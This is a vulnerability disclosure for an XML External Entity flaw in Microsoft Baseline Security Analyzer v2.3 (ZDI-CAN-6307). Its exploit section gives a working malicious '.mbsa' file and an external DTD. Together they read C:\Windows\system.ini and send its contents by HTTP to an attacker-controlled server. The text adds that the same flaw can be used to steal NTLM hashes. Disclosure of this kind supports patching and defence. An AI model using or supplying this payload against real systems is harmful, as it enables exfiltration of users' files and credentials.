[Product]
Microsoft Baseline Security Analyzer v2.3

Microsoft Baseline Security Analyzer (MBSA) is a software tool released by
Microsoft to determine security state by assessing missing security updates
and less-secure
security settings within Microsoft Windows, Windows components such as
Internet Explorer, IIS web server, and products Microsoft SQL Server, and
Microsoft Office macro settings.


[Vulnerability Type]
XML External Entity Injection


[ZDI Reference]
ZDI-CAN-6307


[Security Issue]
Microsoft Baseline Security Analyzer allows local files to be exfiltrated
to a remote attacker controlled server if a user opens a specially crafted
".mbsa" file.



[Exploit/POC]

Install MBSA

https://www.microsoft.com/en-us/download/details.aspx?id=7558

1) "evil.mbsa"

<?xml version="1.0"?>
<!DOCTYPE fileppe_fingerz [
<!ENTITY % file SYSTEM "C:\Windows\system.ini">
<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>

2) "payload.dtd"

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
%all;

When victim attempts open file they get prompted "Do you want to let this
app make changes to your device?"
However, it also indicates it is a "verified publisher" namely Microsoft.
After opening the local users files can be exfiltrated to a remote server.
Moreover, we can use this to steal NTLM hashes.
